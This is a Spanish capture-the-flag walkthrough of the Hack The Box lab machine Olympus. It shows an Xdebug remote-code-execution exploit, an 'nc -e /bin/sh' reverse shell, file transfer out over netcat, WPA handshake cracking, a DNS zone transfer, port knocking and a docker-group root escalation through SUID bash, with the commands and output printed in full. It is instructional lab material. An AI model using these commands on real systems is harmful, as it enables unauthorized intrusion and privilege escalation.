---
title: Hack The Box Olympus
author: k4miyo
date: 2021-09-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [DNS Zone Transfer, Port Knocking, Sandbox Escape]
ping: true
---

## Olympus
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.83.

```bash
❯ ping -c 1 10.10.10.83
PING 10.10.10.83 (10.10.10.83) 56(84) bytes of data.
64 bytes from 10.10.10.83: icmp_seq=1 ttl=63 time=145 ms

--- 10.10.10.83 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 144.725/144.725/144.725/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.83 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-17 17:39 CDT
Initiating Ping Scan at 17:39
Scanning 10.10.10.83 [4 ports]
Completed Ping Scan at 17:39, 0.14s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:39
Scanning 10.10.10.83 [65535 ports]
Discovered open port 53/tcp on 10.10.10.83
Discovered open port 80/tcp on 10.10.10.83
Discovered open port 2222/tcp on 10.10.10.83
Completed SYN Stealth Scan at 17:40, 46.52s elapsed (65535 total ports)
Nmap scan report for 10.10.10.83
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 46.99 seconds
           Raw packets sent: 76104 (3.349MB) | Rcvd: 76091 (3.044MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.83
   5   │     [*] Open ports: 53,80,2222
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p53,80,2222 10.10.10.83 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-17 17:42 CDT
Nmap scan report for 10.10.10.83
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
53/tcp   open  domain  (unknown banner: Bind)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    Bind
| dns-nsid: 
|_  bind.version: Bind
80/tcp   open  http    Apache httpd
|_http-title: Crete island - Olympus HTB
|_http-server-header: Apache
2222/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-City of olympia
| ssh-hostkey: 
|   2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA)
|   256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA)
|_  256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.92%I=7%D=9/17%Time=614519D5%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,3F,"\0=\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04Bind\xc0\x0c\
SF:0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.92%I=7%D=9/17%Time=614519D0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"SSH-2\.0-City\x20of\x20olympia\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.19 seconds
```

Vemos que tiene el puerto 80 abierto, por lo que ya sabemos, tiramos de `whatweb` para ver a lo que nos enfretamos, podríamos ver vía web y nos encontramos una imagen:

```bash
❯ whatweb http://10.10.10.83/
http://10.10.10.83/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.10.83], Title[Crete island - Olympus HTB], UncommonHeaders[x-content-type-options,xdebug], X-Frame-Options[sameorigin], X-XSS-Protection[1; mode=block]
```

![](/assets/images/htb-olympus/olympus_web.png)

Podríamos tirar un `wfuzz` para obtener recursos del sitio web; sin embargo, no nos va a arrojar algún resultado. A este punto, podríamos checar el *header* del servidor con la herramienta `curl`:

```bash
❯ curl -I -X OPTIONS http://10.10.10.83/
HTTP/1.1 200 OK
Date: Fri, 17 Sep 2021 23:09:34 GMT
Server: Apache
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
Xdebug: 2.5.5
Content-Length: 314
Content-Type: text/html; charset=UTF-8
```

Aqui vemos el uso de *Xdebug 2.5.5* el cual podríamos buscar si existe algún exploit público mediante `searchsploit`:

```bash
❯ searchsploit Xdebug 2.5.5
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
xdebug < 2.5.5 - OS Command Execution (Metasploit)                                             | php/remote/44568.rb
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Vemos que existen un módulo de metasploit, pero nosotros no ocupamos eso; así que buscamos un exploit en github:

[Xdebug Command Execution](https://github.com/k4miyo/Xdebug-Command-Execution)

Nos descargamos el exploit y procedemos a ejecutarlo indicandole los valores que nos solicita.

```bash
❯ python3 xdebug_rce.py --rhost 10.10.10.83 --lhost 10.10.14.16
[+] Payload: Connection received from 10.10.10.83:41632 on port 9000
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.83 on port 59748
[+] Reverse shell: Established connection
[*] Switching to interactive mode
$ whoami
www-data
```

Para trabajar más cómodos, nos entablamos una reverse shell. Así mismo, hacemos un [Tratamiento de la tty](/posts/tratamiento-tty):

```bash
$ nc -e /bin/sh 10.10.14.16 443
$ 
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.83] 59750
whoami
www-data
```

Observando un poco la terminal, vemos que nos encontramos en un contenedor, debido a que el prompt se nota `www-data@f00ba96171c5:/var/www/html`, además de que la dirección IP no corresponde con la máquina:

```bash
ww-data@f00ba96171c5:/var/www/html$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:ac:14:00:02  
          inet addr:172.20.0.2  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:645 errors:0 dropped:0 overruns:0 frame:0
          TX packets:501 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:45176 (44.1 KiB)  TX bytes:50772 (49.5 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

Vamos a dirigirnos a la ruta `/home/` y encontramos una carpeta del usuario `zeus`; nos metemos en dicha carpeta y vemos otra con nombre `airgeddon`, que investigando un poco, notamos que se trata de un programa para realizar auditorías Wi-Fi en Linux. Por lo tanto ingresamos en dicha carpeta y posterior a `captured`:

```bash
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ pwd
/home/zeus/airgeddon/captured
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ ls -l
total 296
-rw-r--r-- 1 zeus zeus 297917 Apr  8  2018 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8  2018 papyrus.txt
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ cat papyrus.txt 
Captured while flying. I'll banish him to Olympia - Zeus
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$
```

Aquí vemos dos archivos, uno `papyrus.txt` que contiene la leyenda `Captured while flying. I'll banish him to Olympia - Zeus` y otro `captured.cap`; por lo que nos indica que debemos de hacer algo que el archivo `.cap`, así que nos lo pasamos a nuestra máquina para analizarlo:

```bash
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ nc 10.10.14.16 4646 < captured.cap

^C
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$
```

```bash
❯ nc -nlvp 4646 > captured.cap
listening on [any] 4646 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.83] 40066
```

Esperamos unos segundos y cancelamos en la máquina víctima. Ahora vamos a validar que la información haya sido enviada correctamente:

```bash
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ du -hc captured.cap 
292K    captured.cap
292K    total
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$ md5sum captured.cap 
2a86b639f23067dd95a5e0b5f616ef20  captured.cap
www-data@f00ba96171c5:/home/zeus/airgeddon/captured$
```

```bash
❯ du -hc captured.cap
292K    captured.cap
292K    total
❯ md5sum captured.cap
2a86b639f23067dd95a5e0b5f616ef20  captured.cap
```

Vemos que ambos archivos tienen el mismo peso y mismo hash, así que tenemos la certeza de que se transfirió correstamente. Vamos a analizarlo en nuestra máquina con la herramienta `aircrack-ng`:

```bash
❯ aircrack-ng captured.cap
Reading packets, please wait...
Opening captured.cap
Read 6498 packets.

   #  BSSID              ESSID                     Encryption

   1  F4:EC:38:AB:A8:A9  Too_cl0se_to_th3_Sun      WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening captured.cap
Read 6498 packets.

1 potential targets

Please specify a dictionary (option -w).

❯ aircrack-ng -J Captura captured.cap                                                                                            
Reading packets, please wait...                                                                                                  
Opening captured.cap
Read 6498 packets.                                              
                                                                
   #  BSSID              ESSID                     Encryption
                                                                
   1  F4:EC:38:AB:A8:A9  Too_cl0se_to_th3_Sun      WPA (1 handshake)
                                
Choosing first network as target.                  
                                
Reading packets, please wait...                                 
Opening captured.cap                                            
Read 6498 packets.                                              
                                                                
1 potential targets                                             
                                                                
                                                                
                                
Building Hashcat file...
                                                                
[*] ESSID (length: 20): Too_cl0se_to_th3_Sun
[*] Key version: 2
[*] BSSID: F4:EC:38:AB:A8:A9                                    
[*] STA: C0:EE:FB:DF:FC:2A
[*] anonce:
    8F FA CA 5A 25 EB 30 36 44 2F 5E E9 C6 34 A5 E8 
    68 09 B1 53 55 F1 B6 92 2E 8A 9A 58 94 98 C9 29 
[*] snonce:
    B3 07 A4 0F 83 CE 69 EA 11 03 A3 2A 8D 6C 29 A4 
    64 BD 91 FA 5F F3 CE A5 25 0D 45 48 EE AC AC 34 
[*] Key MIC:
    AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 B3 07 A4 0F 83 CE 69 EA 11 03 A3 2A 8D 6C 29 
    A4 64 BD 91 FA 5F F3 CE A5 25 0D 45 48 EE AC AC 
    34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00
```

Con el comando `aircrack-ng captured.cap` podemos ver los datos relacionados a la captura. De los resultados arrojados, vemos que el **ESSID** tiene un valor *raro*: ***Too_cl0se_to_th3_Sun*** que igual y puede ser una contraseña, por lo que la guardamos. 

Ahora, como el comando `aircrack-ng -J Captura captured.cap` creamos el archivo `Captura.hccap` el cual contiene la información más relevante de la captura y con el cual obtendremos un hash para posterior crackearlo.

```bash
❯ hccap2john Captura.hccap
Too_cl0se_to_th3_Sun:$WPAPSK$Too_cl0se_to_th3_Sun#xCkseuWdkCvvrzkegkSY1sDCOScF.uAeXKkdd4GxYTdTwwuZ7Ep3GCugf1GDygdO7SgkBYEjLib4B8LcO.alIpLlhd6iWddMZ7X78E21.5I0.Ec............/gkSY1sDCOScF.uAeXKkdd4GxYTdTwwuZ7Ep3GCugf1E.................................................................3X.I.E..1uk2.E..1uk2.E..1uk0..01b4et9gC6AIfumdP01HPcoP0q81Iv4uemh9zM/L33UBjp....................................................................................................................................../t.....U...8kOQsHvjrKQVgxPKjG8H1U:c0eefbdffc2a:f4ec38aba8a9:f4ec38aba8a9::WPA2:Captura.hccap
```

Antes de btener la contraseña, vamos a pensar en las pistas que nos proporciona la máquina. Recordemos que existe el archivo `papyrus.txt` el cual tiene el texto: *Captured while flying. I'll banish him to Olympia - Zeus*; aquí nos habla de dioses de la mitología griega relacionados con un vuelo, por lo que buscando un poco en [Google](https://www.google.com/) 

![](/assets/images/htb-olympus/olympus_icaro.png)

Vemos que se trata de ***Icaro*** o ***Icarus***, así que nos vamos a crear un direccionario a partir de `rockyou.txt` de aquellas palabras que contengan *icar*:

```bash
❯ cat /usr/share/wordlists/rockyou.txt | grep "icar" > diccionario.txt
```

Ahora si procedemos a obtener la contraseña:

```bash
❯ aircrack-ng -w diccionario.txt captured.cap

                               Aircrack-ng 1.6 

      [00:00:14] 4555/4591 keys tested (332.14 k/s) 

      Time left: 0 seconds                                      99.22%

                        KEY FOUND! [ flightoficarus ]


      Master Key     : B1 D1 0A 51 A8 BF F2 F9 35 BC 56 5E 30 CA D5 4D 
                       05 1F 77 B3 BB 39 E2 4F 45 03 66 F6 12 2D 1B 23 

      Transient Key  : A8 1E 31 D3 6D A0 7B BA 82 73 04 31 99 3C BF 89 
                       17 6C 29 B1 50 72 C2 AC 2C 18 0B 6B 5F F9 D6 E7 
                       93 F9 AC 2A AD D3 F2 35 60 75 CF B3 5C 8F 6D AB 
                       F6 00 BA 73 8E 7C 72 AA 38 01 10 41 80 13 F8 A4 

      EAPOL HMAC     : 1D 54 03 3C B2 5E A2 BC D5 86 5A 09 67 82 12 85 
```

Ya tenemos otra posible contraseña, asi que la guardamos. Recordando, la máquina tiene el pueto 2222 abierto asociado al servicio SSH, por lo que podemos probar conectarnos a dicho puerto como el usuario ***icarus*** y utilizar las dos posibles contraseñas obtenidas:

```bash
❯ ssh icarus@10.10.10.83 -p2222
The authenticity of host '[10.10.10.83]:2222 ([10.10.10.83]:2222)' can't be established.
ECDSA key fingerprint is SHA256:uyZtmsYFq/Ac58+SEgLsL+NK05LlH2qwp2EXB1DxlO4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.83]:2222' (ECDSA) to the list of known hosts.
icarus@10.10.10.83's password: 
Last login: Sun Apr 15 16:44:40 2018 from 10.10.14.4
icarus@620b296204a3:~$ whoami
icarus
icarus@620b296204a3:~$
```

Ya ingresamos a la máquina como el usuario ***icarus***; sin embargo, nos damos cuenta de que nos encontramos en otro contenedor debido al prompt `icarus@620b296204a3:~` y la dirección IP:

```bash
icarus@620b296204a3:~$ hostname -I
172.19.0.2 
icarus@620b296204a3:~$ 
```

En el directorio del usuario vemos el archivo `help_of_the_gods.txt`, el cual nos podría dar otra pista; en este caso el dominio **ctfolympus.htb**. Así que lo metemos en el `/etc/hosts` y debemos estar pensando en un posible *Domain Zone Transfer* debido a que se encuentra abierto el puerto 53.

```bash
icarus@620b296204a3:~$ pwd
/home/icarus
icarus@620b296204a3:~$ ls -l
total 4
-rw-r--r-- 1 root root 85 Apr 15  2018 help_of_the_gods.txt
icarus@620b296204a3:~$ cat help_of_the_gods.txt 

Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb

icarus@620b296204a3:~$
```

```bash
❯ dig @10.10.10.83 ctfolympus.htb

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.83 ctfolympus.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17763
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;ctfolympus.htb.                        IN      A

;; ANSWER SECTION:
ctfolympus.htb.         86400   IN      A       192.168.0.120

;; AUTHORITY SECTION:
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.

;; ADDITIONAL SECTION:
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120

;; Query time: 304 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: dom sep 19 00:20:21 CDT 2021
;; MSG SIZE  rcvd: 127

❯ dig @10.10.10.83 ctfolympus.htb axfr

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.83 ctfolympus.htb axfr
; (1 server found)
;; global options: +cmd
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.         86400   IN      A       192.168.0.120
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 148 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: dom sep 19 00:22:25 CDT 2021
;; XFR size: 15 records (messages 1, bytes 475)
```

Ojito, que nos están dando otra pista ***"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"***. Nos están indicando un posible usuario **prometheus**, una contraseña **St34l_th3_F1re!** y unos puertos **3456 8234 62431**, por lo que ya debemos estar pensando en *port knocking*. Para este caso vamos a tirar el `nmap`:

```bash
❯ nmap -p3456,8234,62431 10.10.10.83 -r; ssh prometheus@10.10.10.83
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 00:27 CDT
Nmap scan report for ctfolympus.htb (10.10.10.83)
Host is up (0.15s latency).

PORT      STATE  SERVICE
3456/tcp  closed vat
8234/tcp  closed unknown
62431/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
The authenticity of host '10.10.10.83 (10.10.10.83)' can't be established.
ECDSA key fingerprint is SHA256:8TR2+AWSBT/c5mrjpDotoEYu0mEy/jCzpuS79d+Z0oY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.83' (ECDSA) to the list of known hosts.
prometheus@10.10.10.83's password: 

Welcome to
                            
    )         (             
 ( /(     )   )\ )   (      
 )\()) ( /(  (()/(  ))\ (   
((_)\  )(_))  ((_))/((_))\  
| |(_)((_)_   _| |(_)) ((_) 
| ' \ / _` |/ _` |/ -_)(_-< 
|_||_|\__,_|\__,_|\___|/__/ 
                           
prometheus@olympus:~$ whoami
prometheus
prometheus@olympus:~$
```

Ahora si ya nos encontramos dentro de la máquina como el usuario *prometheus* y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, así que enumeramos un poco el sistema:

```bash
prometheus@olympus:~$ id
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
```

Vemos que nos encontramos dentro del grupo **docker**, así que podemos crear un contenedor montando la raiz `/`:

```bash
prometheus@olympus:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
crete               latest              31be8149528e        3 years ago         450MB
olympia             latest              2b8904180780        3 years ago         209MB
rodhes              latest              82fbfd61b8c1        3 years ago         215MB
prometheus@olympus:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
f00ba96171c5        crete               "docker-php-entrypoi…"   3 years ago         Up 5 hours          0.0.0.0:80->80/tcp                       crete
ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   3 years ago         Up 5 hours          0.0.0.0:53->53/tcp, 0.0.0.0:53->53/udp   rhodes
620b296204a3        olympia             "/usr/sbin/sshd -D"      3 years ago         Up 5 hours          0.0.0.0:2222->22/tcp                     olympia
prometheus@olympus:~$ docker run --rm -it -v /:/mnt rodhes bash
cat: /etc/hostip: No such file or directory
root@f51b8f68f6ab:/# cd /mnt
root@f51b8f68f6ab:/mnt# ls -l
total 76
drwxr-xr-x   2 root root  4096 Apr 15  2018 bin
drwxr-xr-x   3 root root  4096 Apr 15  2018 boot
drwxr-xr-x  17 root root  3080 Sep 19 01:03 dev
drwxr-xr-x  85 root root  4096 Apr 15  2018 etc
drwxr-xr-x   3 root root  4096 Apr  4  2018 home
lrwxrwxrwx   1 root root    29 Apr  2  2018 initrd.img -> boot/initrd.img-4.9.0-6-amd64
lrwxrwxrwx   1 root root    29 Apr  2  2018 initrd.img.old -> boot/initrd.img-4.9.0-4-amd64
drwxr-xr-x  16 root root  4096 Apr  2  2018 lib
drwxr-xr-x   2 root root  4096 Apr  2  2018 lib64
drwx------   2 root root 16384 Apr  2  2018 lost+found
drwxr-xr-x   3 root root  4096 Apr  2  2018 media
drwxr-xr-x   2 root root  4096 Apr  2  2018 mnt
drwxr-xr-x   2 root root  4096 Apr  2  2018 opt
dr-xr-xr-x 171 root root     0 Sep 19 01:03 proc
drwx------   4 root root  4096 Apr 15  2018 root
drwxr-xr-x  17 root root   600 Sep 19 05:32 run
drwxr-xr-x   2 root root  4096 Apr 15  2018 sbin
drwxr-xr-x   2 root root  4096 Apr  2  2018 srv
dr-xr-xr-x  13 root root     0 Sep 19 01:03 sys
drwxrwxrwt   8 root root  4096 Sep 19 05:38 tmp
drwxr-xr-x  10 root root  4096 Apr  2  2018 usr
drwxr-xr-x  11 root root  4096 Apr  2  2018 var
lrwxrwxrwx   1 root root    26 Apr  2  2018 vmlinuz -> boot/vmlinuz-4.9.0-6-amd64
lrwxrwxrwx   1 root root    26 Apr  2  2018 vmlinuz.old -> boot/vmlinuz-4.9.0-4-amd64
root@f51b8f68f6ab:/mnt#
```

En el directorio `/mnt` se encuentra montado la raiz del sistema *padre* y siendo el usuario **root**, podemos visualizar la flag (root.txt). En caso de que queramos una forma más interactiva, podemos dar permisos SUID a la `/bin/bash` y desde la máquina real escalar privilegios.

```bash
root@42a4cc5c0cce:/mnt/root# cd ..
root@42a4cc5c0cce:/mnt# cd bin/
root@42a4cc5c0cce:/mnt/bin# chmod 4755 bash 
root@42a4cc5c0cce:/mnt/bin# ls -l | grep bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 bash
lrwxrwxrwx 1 root root       4 May 15  2017 rbash -> bash
root@42a4cc5c0cce:/mnt/bin# exit
prometheus@olympus:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
prometheus@olympus:~$ bash -p
bash-4.4# whoami
root
bash-4.4#
```
